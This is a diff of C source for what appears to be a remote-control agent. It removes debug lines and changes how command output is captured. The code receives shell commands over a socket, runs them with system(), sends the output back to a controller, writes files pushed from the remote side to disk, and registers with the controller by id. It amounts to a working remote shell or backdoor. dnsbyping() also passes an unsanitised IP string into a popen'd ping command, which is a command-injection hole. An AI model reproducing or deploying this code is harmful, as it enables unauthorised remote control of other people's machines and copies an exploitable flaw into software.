@@ -55,17 +55,13 @@ int report(int ans,int sock, int loglen)
 int xsystem(char* shellbuf, int sock)
 {
 	int pipefd[2], loop, loop2, size= 0, si= 0;
-
 	int fdback[2];
 	fdback[0] = dup(STDOUT_FILENO);
 	fdback[1] = dup(STDERR_FILENO);
-
 	pipe(pipefd);
 	int fd = dup2(pipefd[1], STDOUT_FILENO);
 	fd = dup2(pipefd[1], STDERR_FILENO);
-	DEBUGW;
 	system(shellbuf);
-	DEBUGW;
 /*	char buf[4096];
 	int m, n;
 	while((m = read(pipefd[0], buf, 4096)) > 0)
@@ -73,11 +69,12 @@ int xsystem(char* shellbuf, int sock)
 			break;
 */
 	char* buf[20] = {0};
-	DEBUGW;
 	for(loop = 0; loop<20; loop++)
 	{
 		buf[loop] = (char*)malloc(4096);
 		si = read(pipefd[0], buf[loop], 4096);
+		write(2, &si, 4);
+		write(2, buf[loop], si);
 		size+=si;
 		if(si!=4096)
 		{
@@ -85,11 +82,12 @@ int xsystem(char* shellbuf, int sock)
 			break;
 		}
 	}
-	DEBUGW;
+	dup2(fdback[0], STDOUT_FILENO);
+	dup2(fdback[1], STDERR_FILENO);
+
 	int ans = report(1,sock,size);
 	if(ans == false)
-		return false;	
-	DEBUGW;
+		return false;
 	for(loop2 = 0; loop2<loop; loop2++)
 	{
 		if(loop2 == loop-1)
@@ -98,9 +96,7 @@ int xsystem(char* shellbuf, int sock)
 			sendpt(sock, buf[loop2], 4096);
 		free(buf[loop2]);
 	}
-	DEBUGW;
-	dup2(fdback[1], STDOUT_FILENO);
-	dup2(fdback[1], STDERR_FILENO);
+
 	
 }
 
@@ -112,7 +108,6 @@ int waiting(int sock)
 		int n = recvpt(sock,&k,sizeof(U_MSG));
 		if(n!=sizeof(U_MSG))
 		{
-			DEBUGW;DEBUGI(n);
 			perror("read err");
 			return false;
 		}
@@ -122,9 +117,7 @@ int waiting(int sock)
 			{	
 				char *shellbuf = (char*)malloc(k.shell_m.commandlen+1);
 				memset(shellbuf,0,k.shell_m.commandlen+1);
-				DEBUGW;
 				n = recvpt(sock,shellbuf,k.shell_m.commandlen);
-				DEBUGW;DEBUGI(n);
 				if(n!=k.shell_m.commandlen)
 				{
 					perror("read err");
@@ -138,9 +131,7 @@ int waiting(int sock)
 				}
 				else
 				{
-					DEBUGW;DEBUGS(shellbuf);
 					xsystem(shellbuf, sock);
-					DEBUGW;
 					free(shellbuf);					
 				}
 				break;
@@ -149,16 +140,13 @@ int waiting(int sock)
 			{
 				char *tfilebuf = (char*)malloc(k.tfile_m.path+1);
 				memset(tfilebuf,0,k.tfile_m.path+1);
-				DEBUGW;
 				n = recvpt(sock,tfilebuf,k.tfile_m.path);
-				DEBUGW;
 				if(n!=k.tfile_m.path)
 				{
 					perror("read err");
 					free(tfilebuf);
 					return false;
 				}
-				printf("%s\n", tfilebuf);
 				int fd = r_creatfile(tfilebuf);
 				if(fd == -1)
 				{
@@ -168,14 +156,11 @@ int waiting(int sock)
 					free(tfilebuf);
 					continue;
 				}
-				DEBUGW;
 				int ans = report(1,sock,0);
 				if(ans == false)
 					return false;
-				DEBUGW;
 				char buffile[4096] = {0};
 				int m=0, n, o;
-				DEBUGW;
 				while((o = read(sock, buffile, 4096)) > 0)
 				{
 					if( (n = write(fd, buffile, o)) < 0)
@@ -183,7 +168,6 @@ int waiting(int sock)
 					if( (m=m+o) == k.tfile_m.size )
 						break;
 				}
-				DEBUGW;
 /*				
 				int ret;
 				if(k.tfile_m.size > 4096)
@@ -242,10 +226,11 @@ int dnsbyping(char* ip)
 	char newip[30] = {0};
 	char ping[40] = {0};
 	sprintf(ping,"ping %s > %s",ip,filename);
-	pthread_t pid = pthread_run(ping_pthread,ping);
-	sleep(2);
-	pthread_cancel(pid);
-	pthread_join(pid,NULL);
+	//pthread_t pid = pthread_run(ping_pthread,ping);
+	//sleep(2);
+	//pthread_cancel(pid);
+	//pthread_join(pid,NULL);
+	popen(ping, "r");
 	int filefd = open(filename,O_RDWR);
 	if(filefd == -1)
 	{
@@ -339,7 +324,6 @@ int rgist(int sock)
 	extid = k.regist_m.id;
 	char idchr[6] = {0};
 	sprintf(idchr, "%d", extid);
-	DEBUGS(idchr);
 	wrcfg("id", idchr);
 	return k.regist_m.id;
 }
